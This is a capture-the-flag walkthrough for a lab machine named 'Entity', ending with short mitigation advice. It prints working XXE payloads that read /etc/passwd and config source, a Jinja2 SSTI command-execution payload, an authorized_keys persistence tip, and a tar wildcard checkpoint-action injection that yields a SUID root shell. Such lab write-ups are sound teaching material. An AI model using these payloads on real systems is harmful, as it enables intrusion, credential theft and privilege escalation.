---
title: "Writeup: Entity"
date: "2026-03-24"
author: "Dock & Root"
tags: ["Writeup", "XXE", "Local File Inclusion", "SSH Port Forwarding", "SSTI", "Privilege Escalation", "Cron", "Linux", "Hard"]
thumbnail: "../img/placeholder.png"
---

# Writeup: Entity

Welcome to the walkthrough for **Entity**, a Hard-level challenge that perfectly tests multiple advanced domains across Web Exploitation, SSH tunneling, and Linux internals. We will secure our initial foothold via a Web XML vulnerability on a hidden subdomain, pivot laterally using an internal Flask exploit, and then jump to root privileges using a classic wildcard injection.

## 1. Reconnaissance & Subdomains

Our first step is to enumerate the target container. An initial Nmap scan reveals two open ports:

```bash
nmap -sV -sC localhost -p 80,2222
```

* **Port 80/tcp:** Apache HTTP Server running PHP.
* **Port 2222/tcp:** OpenSSH server.

Navigating to `http://localhost` (or `http://entity.local` if added to our `/etc/hosts` file) presents a generic "Entity Corp" under-construction page. The HTML comments mention:
> *Developers: All legacy XML schema parsers have been migrated to the external API cluster.*

Standard directory brute-forcing yields nothing. We must turn to **Subdomain Fuzzing** using a tool like `ffuf` to search for virtual hosts:

```bash
ffuf -w subdomains.txt -u http://entity.local -H "Host: FUZZ.entity.local"
```
*Output: `api` (Status: 200)*

We successfully discover `api.entity.local`. We add it to our `/etc/hosts` file:
```bash
127.0.0.1 entity.local api.entity.local
```

Navigating to `http://api.entity.local` leads us to the hidden "Enterprise XML Validator" service. It allows users to POST XML data to `/parse.php`.

## 2. Initial Access (XML External Entities)

When an application blindly parses user-supplied XML data, it is heavily susceptible to XML External Entities (XXE) attacks. We intercept the HTTP POST request to `parse.php` and define an external entity pointing to `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
  <!ENTITY test SYSTEM "file:///etc/passwd"> 
]>
<root>
    <data>&test;</data>
</root>
```

**Output:** The parsed node data successfully reflects the contents of `/etc/passwd`. We see two non-root users: `svc_monitor` and `dev_team`.

### Extracting Backend Configurations (Base64 wrapper)
To dig deeper, we must extract the source code of the backend `config.php` file. Directly querying `.php` files via XXE breaks the XML parser due to the raw HTML/PHP tags. We bypass this using PHP Base64 Wrappers:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
  <!ENTITY config SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"> 
]>
<root>
    <data>&config;</data>
</root>
```

Decoding the returned Base64 string yields the plaintext source code for `config.php`:

```php
<?php
// ... db configs ...
/*
  INTERNAL NOTE TO DEVOPS TEAM:
  The monitoring service account has been provisioned.
  User: svc_monitor
  Pass: $rvc_M0n!t0r99
*/
?>
```

## 3. Lateral Pivot (SSTI & Port Forwarding)

Using the compromised credentials, we SSH into the container:
```bash
ssh -p 2222 svc_monitor@localhost
```
However, the `user.txt` flag does not belong to `svc_monitor`. It belongs to `dev_team`. We must pivot.

Running `netstat -tulpn` on the local machine reveals an internal service tightly bound to `127.0.0.1:5000`. Checking processes (`ps aux`) reveals this is a Python Flask app running under the `dev_team` user context. 

To attack this web app comfortably from our Kali box, we establish an **SSH Local Port Forward**:
```bash
ssh -p 2222 -L 5000:127.0.0.1:5000 svc_monitor@localhost
```
Navigating to `http://127.0.0.1:5000` in our local browser, we discover an "Internal Markdown Generator".

### Jinja2 Server-Side Template Injection (SSTI)
The application takes our text and renders it. Testing `{{ 7*7 }}` returns `49`—confirming a classic Jinja2 SSTI vulnerability!

We deploy a standard Python RCE payload to execute a reverse shell, or simply read the flag directly. Let's do a direct read:
```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/dev_team/user.txt').read() }}
```

**Output:**
```text
DR{xxe_p4yL04d_LFI_g0t_y0u_1n}
```
We have the User Flag! *(Note: Better yet, use the RCE to write your SSH public key into `/home/dev_team/.ssh/authorized_keys` so you can officially log in via SSH as `dev_team`).*

## 4. Privilege Escalation (Tar Wildcard)

Operating as `dev_team`, we search for root escalation vectors. Checking `/etc/crontab` reveals:
```bash
* * * * * root /usr/local/bin/backup.sh
```

A root-level cron job is executing `backup.sh` every minute.
```bash
#!/bin/bash
cd /home/dev_team/shared_backup
tar -czf /var/backups/shared_backup.tar.gz *
```

### The Tar Wildcard Exploit
The script uses a wildcard (`*`) alongside `tar` inside a directory we own (`/home/dev_team/shared_backup`). Because the bash shell expands wildcards *before* passing the names to `tar`, if we create files named as command-line flags, `tar` will interpret them as actual execution arguments.

We abuse this using the `--checkpoint` and `--checkpoint-action=exec=` arguments to drop a root SUID shell:

```bash
cd /home/dev_team/shared_backup
# 1. Write the payload
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > exploit.sh
# 2. Touch the flags
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh exploit.sh"
```

Wait exactly 60 seconds for the cron job to fire.
```bash
dev_team@entity:~$ ls -la /tmp
-rwsr-sr-x 1 root root 1396520 Mar 24 12:00 bash
```

The root cron job generated the SUID bash binary! We spawn a persistent root shell using `-p`:
```bash
/tmp/bash -p
bash-5.1# cat /root/root.txt
DR{t4r_w1Ldc4rd_1nj3ct10n_pr1v3sc_m4st3r}
```
Machine perfectly Owned!

---

## 🛡️ Best Practices & Fortification
1. **XXE:** Always use `libxml_disable_entity_loader(true);` before parsing foreign XML.
2. **SSTI:** Never use `render_template_string` with direct user input. Always pass variables into context: `render_template_string(template, variable=user_input)`.
3. **Tar Wildcards:** Prevent binary argument injection by appending `--` before the wildcard (`tar -czf archive.tar.gz -- *`), forcing tar to treat everything afterward as pure filenames.
